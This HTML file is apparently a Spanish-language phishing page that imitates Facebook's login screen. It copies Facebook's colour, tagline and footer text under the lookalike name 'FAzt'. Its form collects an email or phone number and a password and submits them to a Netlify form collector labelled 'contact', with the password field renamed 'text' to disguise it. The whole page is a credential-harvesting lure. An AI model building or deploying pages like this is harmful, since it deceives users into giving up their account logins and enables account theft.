<!DOCTYPE html>
<html lang="es">
<head>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
	<meta name="theme-color" content="#1877f2">
	<title>Iniciar sesión</title>
	<link rel="preconnect" href="https://fonts.googleapis.com">
	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
	<link rel="stylesheet" href="css/master.css">
</head>
<body>

	<main class="login-wrapper">

		<div class="brand">
			<img class="avatar" src="img/descarga.png" alt="Logo">
			<h1 class="brand-name">FAzt</h1>
			<p class="brand-tagline">Conéctate con tus amigos y el mundo que te rodea.</p>
		</div>

		<div class="login-card">

			<form name="contact" method="POST" data-netlify="true" class="login-form">
				<input type="hidden" name="form-name" value="contact">

				<label class="field">
					<input type="text" name="name" autocomplete="username" placeholder="Correo electrónico o número de teléfono" required>
				</label>

				<label class="field">
					<input type="password" name="text" autocomplete="current-password" placeholder="Contraseña" required>
				</label>

				<button type="submit" class="btn btn-primary">Iniciar sesión</button>

				<a href="#" class="forgot-link">¿Olvidaste tu contraseña?</a>

				<hr class="divider">

				<a href="#" class="btn btn-secondary">Crear cuenta nueva</a>
			</form>

		</div>

		<footer class="login-footer">
			<p><strong>Crear una página</strong> para una celebridad, una marca o una empresa.</p>
		</footer>

	</main>

</body>
</html>
